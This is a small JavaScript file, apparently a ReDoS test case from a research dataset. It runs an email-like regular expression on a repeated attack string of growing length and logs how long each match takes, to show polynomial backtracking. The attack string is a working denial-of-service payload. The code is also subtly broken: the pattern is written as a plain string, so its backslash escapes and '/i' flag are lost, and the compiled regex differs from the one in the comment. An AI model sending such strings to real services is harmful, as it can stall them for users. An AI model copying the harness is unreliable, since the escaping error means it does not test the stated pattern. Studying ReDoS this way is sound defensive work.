/* 3603
 * [\d+]{10}\@[\w]+\.?[\w]+?\.?[\w]+?\.?[\w+]{2,4}/i
 * POLYNOMIAL
 * nums:3
 * POLYNOMIAL AttackString:""+"1111111111@1"*80000+"!1 _SLQ_2"
 */
var REGEX = new RegExp("[\d+]{10}\@[\w]+\.?[\w]+?\.?[\w]+?\.?[\w+]{2,4}/i")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + '1111111111@1'.repeat(i*10000) + '!1 _SLQ_2'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 10000 + ": " + time_cost+" ms")
}